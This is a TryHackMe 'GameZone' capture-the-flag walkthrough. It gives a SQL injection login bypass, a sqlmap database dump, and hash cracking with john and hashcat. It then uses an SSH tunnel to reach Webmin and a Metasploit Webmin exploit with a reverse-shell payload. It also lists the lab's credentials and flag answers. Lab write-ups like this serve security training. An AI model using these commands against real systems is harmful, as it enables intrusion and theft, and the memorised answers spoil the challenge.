# GameZone Wlakthrough
### Link
- https://tryhackme.com/room/gamezone
------------------------
- What is the name of the large cartoon avatar holding a sniper on the forum?
	- **Answer** : Agent 47 (main character of the videogame HITMAN)
- Obtain access via SQLi
	- Use ' or 1=1 -- - as your username and leave the password blank.
     - picture: [GameZone_1.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_1.png)
	- **Answer** : portail.php
- Using SQLMap
	- Intercept the request from portail.php by using BurpSuite
         - picture: [GameZone_3.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_3.png),[GameZone_4.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_4.png)
	- Save the request in text file
	- We can then pass this into SQLMap to use our authenticated user session.
		SQLMap option:
			-r uses the intercepted request you saved earlier
			--dbms tells SQLMap what type of database management system it is
			--dump attempts to outputs the entire database
		sqlmap -r request --dbms=mysql --dump
        - picture: [GameZone_5.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_5.png)
	- In the users table, what is the hashed password?
	    - **Answer**: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
	- What was the username associated with the hashed password?
		- **Answer**: agent47
	- What was the other table name?
		- **Answer**: post
- Cracking a password with Johntheripper
	John option:
			hash.txt - contains a list of your hashes (in your case its just 1 hash)
			--wordlist - is the wordlist you're using to find the dehashed value
			--format - is the hashing algorithm used. In our case its hashed using SHA256.
	john hash.txt --wordlist=[path the wordlist] --format=Raw-SHA256


- Cracking with hashcat

	sudo hashcat -m 1400 [path to hash file] [path to wordlist] --force
    - picture: [GameZone_6.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_6.png),[GameZone_7.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_7.png),[GameZone_8.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_8.png)
	- What is the de-hashed password?
		- **Answer**: videogamer124
	- What is the user flag?
		- **Answer**:649ac17b1480ac13ef1e4fa579dac95c

- Exposing services with reverse SSH tunnels
	- How many TCP sockets are running? 
    - picture: [GameZone_9.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_9.png)
	- execute the command : ss -tulpn
	    - **Answer**: 5

	
We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!

From our local machine, run ssh -L 10000:localhost:10000 <username>@<ip>

Once complete, in your browser type "localhost:10000" and you can access the newly-exposed webserver.

- What is the name of the exposed CMS?
 - picture: [GameZone_12.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_12.png)
	- **Answer**: webmin

- What is the CMS version?	
 - picture: [GameZone_13.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_13.png)
	- **Answer**:1.580


- Privilege Escalation with Metasploit
	- start metasploit
	- search exploit undr the metasploit db
		- search webmin
         - picture: [GameZone_14.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_14.png)
		- Select the Remote command execution -->  0  exploit/unix/webapp/webmin_show_cgi_exec
		- use [exploit number]
		- check settings : show info
         - picture: [GameZone_15.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_15.png)
			- We need to set PASSWORD / USERNAME / RHOST / RPORT
             - picture: [GameZone_16.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_16.png)	
				- set PASSWORD videogamer124
				- set USERNAME agent47
				- set RPORT 10000
				- set RHOST localhost (we target the localhost not the IP)
				- set ssl false (we are connecting to  port than 80) 	
			- show payloads
				- set payload cmd/unix/reverse
                 - picture: [GameZone_18.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_9.png)
				- set lhost [local machine IP]
                 - picture: [GameZone_19.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_9.png)
			- Execute the payload
				- run
                 - picture: [GameZone_20.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_20.png)
			- access to the session in background
				- sessions 1
                 - picture: [GameZone_21.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_21.png)
			- find the flag
                - picture: [GameZone_22.png](https://github.com/LNB283/THM/blob/main/EASY/GameZone/Pictures/GameZone_22.png)
				 - **Answer**:a4b945830144bdd71908d12d902adeee